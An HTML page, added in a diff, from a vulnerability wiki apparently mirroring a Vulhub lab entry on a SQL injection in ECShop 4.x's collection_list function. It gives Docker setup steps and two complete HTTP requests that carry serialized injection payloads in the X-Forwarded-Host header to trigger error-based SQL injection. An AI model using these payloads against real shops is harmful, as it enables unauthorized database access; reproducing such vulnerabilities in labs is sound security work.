@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/ECShop/collection_list-sqli/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>ECShop 4.x collection_list SQL Injection - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "ECShop 4.x collection_list SQL Injection", url: "#_top", children: [
+              {title: "Environment Setup", url: "#environment-setup" },
+              {title: "Vulnerability Reproduction", url: "#vulnerability-reproduction" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="README.zh-cn/" class="btn btn-xs btn-link">
+        ECShop 4.x Collection List SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Ecshop%204.0.7%20%E4%BB%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Ecshop%204.0.7%20%E4%BB%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Ecshop 从反序列化到类型混淆漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="ecshop-4x-collection_list-sql-injection">ECShop 4.x <code>collection_list</code> SQL Injection<a class="headerlink" href="#ecshop-4x-collection_list-sql-injection" title="Permanent link">&para;</a></h1>
+<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
+<p>ECShop is a popular open-source e-commerce system. A SQL injection vulnerability exists in the <code>collection_list</code> functionality of ECShop 4.x versions, which allows attackers to execute arbitrary SQL queries through the <code>insert_</code> functions.</p>
+<p>References:</p>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/xHioArEpoAqGlHJPfq3Jiw">https://mp.weixin.qq.com/s/xHioArEpoAqGlHJPfq3Jiw</a></li>
+<li><a href="http://foreversong.cn/archives/1556">http://foreversong.cn/archives/1556</a></li>
+</ul>
+<h2 id="environment-setup">Environment Setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
+<p>Execute the following command to start ECShop 4.0.6:</p>
+<div class="highlight"><pre><span></span><code>docker compose up -d
+</code></pre></div>
+<p>After the server starts, visit <code>http://your-ip:8080</code> to begin the installation process. During installation:</p>
+<ul>
+<li>Set the database address to <code>mysql</code></li>
+<li>Set both username and password to <code>root</code></li>
+</ul>
+<h2 id="vulnerability-reproduction">Vulnerability Reproduction<a class="headerlink" href="#vulnerability-reproduction" title="Permanent link">&para;</a></h2>
+<p>The vulnerability is similar to <a href="https://github.com/vulhub/vulhub/tree/master/ecshop/xianzhi-2017-02-82239600">xianzhi-2017-02-82239600</a>, where arbitrary <code>insert_</code> functions can be exploited for SQL injection.</p>
+<p>Multiple <code>insert_</code> functions can be used for exploitation. For example, using <code>insert_user_account</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/user.php?act=collection_list</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">your-ip:8080</span>
+<span class="na">X-Forwarded-Host</span><span class="o">:</span> <span class="l">45ea207d7a2b68c49582d2d22adf953auser_account|a:2:{s:7:&quot;user_id&quot;;s:38:&quot;0&#39;-(updatexml(1,repeat(user(),2),1))-&#39;&quot;;s:7:&quot;payment&quot;;s:1:&quot;4&quot;;}|45ea207d7a2b68c49582d2d22adf953a</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36</span>
+<span class="na">Cookie</span><span class="o">:</span> <span class="l">ECS_ID=f7b1398a0fdc189b691a6f1c969911ac1eea8fca;ECS[password]=445ac05c4ae0555ed091bb977b08581f;ECS[user_id]=3;ECS[username]=demo;ECS[visit_times]=2;ECSCP_ID=1a8bddd69b3b81efbe441a185ac52e7d24852d87;PHPSESSID=bb2033d66975ff7c2be29896d2d4260c;real_ipd=172.18.0.1;</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+</code></pre></div>
+<p><img alt="" src="1.png" /></p>
+<p>Note: You must be logged in as a normal user before attempting exploitation.</p>
+<p>Alternatively, you can use <code>insert_pay_log</code> as shown in this example:</p>
+<div class="highlight"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/user.php?act=collection_list</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">192.168.1.162:8080</span>
+<span class="na">X-Forwarded-Host</span><span class="o">:</span> <span class="l">45ea207d7a2b68c49582d2d22adf953apay_log|s:44:&quot;1&#39; and updatexml(1,repeat(user(),2),1) and &#39;&quot;;|</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36</span>
+<span class="na">Cookie</span><span class="o">:</span> <span class="l">ECS_ID=f7b1398a0fdc189b691a6f1c969911ac1eea8fca;ECS[password]=445ac05c4ae0555ed091bb977b08581f;ECS[user_id]=3;ECS[username]=demo;ECS[visit_times]=2;ECSCP_ID=1a8bddd69b3b81efbe441a185ac52e7d24852d87;PHPSESSID=bb2033d66975ff7c2be29896d2d4260c;real_ipd=172.18.0.1;</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+</code></pre></div>
+<p><img alt="" src="2.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="README.zh-cn/" class="btn btn-xs btn-link">
+        ECShop 4.x Collection List SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Ecshop%204.0.7%20%E4%BB%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Ecshop%204.0.7%20%E4%BB%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Ecshop 从反序列化到类型混淆漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
